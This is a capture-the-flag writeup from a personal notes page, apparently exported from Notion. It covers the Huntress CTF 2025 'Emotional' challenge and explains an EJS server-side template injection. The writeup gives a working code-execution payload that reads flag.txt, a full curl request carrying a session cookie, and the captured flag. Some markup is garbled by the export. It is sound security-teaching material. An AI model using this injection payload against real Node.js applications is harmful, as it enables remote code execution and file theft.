@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2025-10-06 · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="huntress/2025/2025-10-06.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/huntress/index.html">Huntress CTF</a> &rsaquo; <a href="/huntress/2025/index.html">2025</a></div>
+  <h1 id="2025-10-06">2025-10-06</h1>
+<h1 id="emotional"><strong>🌐 Emotional</strong></h1>
+<p><span class="img-missing">image unavailable</span></p>
+<p>```plain text</p>
+<pre><code>const emojis = [
+    '😊', '😄', '😃', '😁', '😆', '😅', '😂', '🤣',
+    '😇', '🙂', '🙃', '😉', '😌', '😍', '🥰', '😘',
+    '😗', '😙', '😚', '😋', '😛', '😝', '😜', '🤪',
+    '🤨', '🧐', '🤓', '😎', '🤩', '🥳', '😏', '😒',
+    '😞', '😔', '😟', '😕', '🙁', '☹️', '😣', '😖',
+    '😫', '😩', '🥺', '😢', '😭', '😤', '😠', '😡',
+    '🤬', '🤯', '😳', '🥵', '🥶', '😱', '😨', '😰',
+    '😥', '😓', '🤗', '🤔', '🤭', '🤫', '🤥', '😶',
+    '😐', '😑', '😬', '🙄', '😯', '😦', '😧', '😮',
+    '😲', '🥱', '😴', '🤤', '😪', '😵', '🤐', '🥴',
+    '🤢', '🤮', '🤧', '😷', '🤒', '🤕', '🤑', '🤠',
+    '😈', '👿', '👹', '👺', '🤡', '💩', '👻', '💀',
+    '☠️', '👽', '👾', '🤖', '🎃', '😺', '😸', '😹',
+    '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉',
+    '🙊', '💋', '👋', '🤚', '🖐️', '✋', '🖖', '👌',
+    '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉',
+    '👆', '🖕', '👇', '☝️', '👍', '👎', '👊', '✊',
+    '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏'
+];
+
+let selectedEmoji = "😊";
+
+const emojiGrid = document.getElementById('emojiGrid');
+emojis.forEach(emoji =&gt; {
+    const btn = document.createElement('button');
+    btn.className = 'emoji-btn';
+    btn.textContent = emoji;
+    btn.onclick = () =&gt; selectEmoji(emoji);
+    emojiGrid.appendChild(btn);
+});
+
+function selectEmoji(emoji) {
+    selectedEmoji = emoji;
+    document.getElementById('currentEmoji').textContent = emoji;
+    document.getElementById('selectedEmoji').textContent = emoji;
+
+    document.querySelectorAll('.emoji-btn').forEach(btn =&gt; {
+        btn.classList.remove('selected-emoji');
+        if (btn.textContent === emoji) {
+            btn.classList.add('selected-emoji');
+        }
+    });
+}
+
+selectEmoji(selectedEmoji);
+</code></pre>
+<pre><code>
+```plain text
+John released the source cause things we're crashing, didn't help more than we had though, we were trying the SSTI EJS template injections
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p>```plain text<br />
+Summary: This challenge exploited a Server-Side Template Injection (SSTI) vulnerability in an EJS template where user-controlled emoji input was directly concatenated into the template string before rendering, allowing arbitrary Node.js code execution to read the flag file.<br />
+How we determined this was the way:</p>
+<p>By examining the server.js code, we identified that profile.emoji was being directly injected into the EJS template via data.replace(/&lt;% profileEmoji %&gt;/g, profile.emoji) before ejs.render() executed it, and the index.ejs file used &lt;%- (unescaped output) syntax for selectedEmoji, meaning any EJS code we injected would be executed server-side.</p>
+<p>How the request worked:</p>
+<p>The payload &lt;%- global.process.mainModule.require('fs').readFileSync('flag.txt','utf8') %&gt; was stored as the emoji value, then when the homepage was loaded, the server's replace() injected our EJS code into the template, which was then executed by ejs.render(), causing Node.js to read and output the flag.txt contents into the rendered HTML.</p>
+<p>Key insight:</p>
+<p>The vulnerability chain had two stages: first, the /setEmoji endpoint stored our malicious EJS payload without validation, and second, the / endpoint's flawed string replacement mechanism allowed our payload to be interpreted as executable template code rather than plain text.</p>
+<pre><code>
+&lt;span class=&quot;img-missing&quot;&gt;image unavailable&lt;/span&gt;
+
+```plain text
+curl -X POST 'https://432c01de.proxy.coursestack.com/setEmoji' \
+-H 'Cookie: token=432c01de-7e3b-4b57-a9ba-018de2f933b2_1_9f5812ff937019e9c70e1ad92308369f5e522426e954ff6d5bac135f13114e11' \
+-H 'Content-Type: application/json' \
+-d '{&quot;emoji&quot;: &quot;&lt;%- global.process.mainModule.require('\''fs'\'').readFileSync('\''flag.txt'\'','\''utf8'\'') %&gt;&quot;}'
+{&quot;profileEmoji&quot;:&quot;&lt;%- global.process.mainModule.require('fs').readFileSync('flag.txt','utf8') %&gt;&quot;}
+</code></pre>
+<p _="%&gt;&quot;" _profileEmoji_:_-="&quot;profileEmoji&quot;:&quot;&lt;%-" global.process.mainModule.require_fs_.readFileSync_flag.txt_utf8_="global.process.mainModule.require('fs').readFileSync('flag.txt','utf8')">```plain text<br />
+curl -X POST 'https://432c01de.proxy.coursestack.com/setEmoji' \<br />
+-H 'Cookie: token=432c01de-7e3b-4b57-a9ba-018de2f933b2_1_9f5812ff937019e9c70e1ad92308369f5e522426e954ff6d5bac135f13114e11' \<br />
+-H 'Content-Type: application/json' \<br />
+-d '{"emoji": "&lt;%- global.process.mainModule.require('\''fs'\'').readFileSync('\''flag.txt'\'','\''utf8'\'') %&gt;"}'<br /></p>
+<pre><code>
+```plain text
+Had to mash the refresh to get it to reprint again
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<p><code>plain text
+ flag{8c8e0e59d1292298b64c625b401e8cfa}</code></p>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
